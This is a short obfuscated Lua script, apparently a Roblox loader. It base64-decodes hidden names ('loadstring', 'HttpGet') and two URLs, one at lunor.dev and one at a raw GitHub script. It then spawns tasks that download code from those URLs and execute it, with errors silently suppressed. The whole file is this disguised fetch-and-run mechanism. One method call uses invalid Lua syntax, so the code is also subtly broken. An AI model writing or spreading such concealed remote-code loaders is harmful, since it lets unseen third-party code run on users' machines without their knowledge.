local B='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function D(s)
    s=s:gsub('[^'..B..'=]','')
    return (s:gsub('.',function(x)
        if x=='='then return''end
        local r,f='',(B:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
        if#x~=8 then return'' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end
        return string.char(c)
    end))
end

local K={D("dGFzaw=="),D("c3Bhd24="),D("bG9hZHN0cmluZw=="),D("Z2FtZQ=="),D("SHR0cEdldA==")}
local U={D("aHR0cHM6Ly9sdW5vci5kZXYvbG9hZGVy"),D("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VwZGF0ZXMtU2NyaXB0L1VwZGF0ZWQvcmVmcy9oZWFkcy9tYWluL1NjcmlwdC5sdWE=")}

local function R(u)
    local ok,b=pcall(function()return(getfenv()[K[4]]):[K[5]](u)end)
    if ok and b then
        local f=getfenv()[K[3]]or load
        if f then pcall(f(b)) end
    end
end

getfenv()[K[1]][K[2]](function()R(U[1])end)
getfenv()[K[1]][K[2]](function()R(U[2])end)
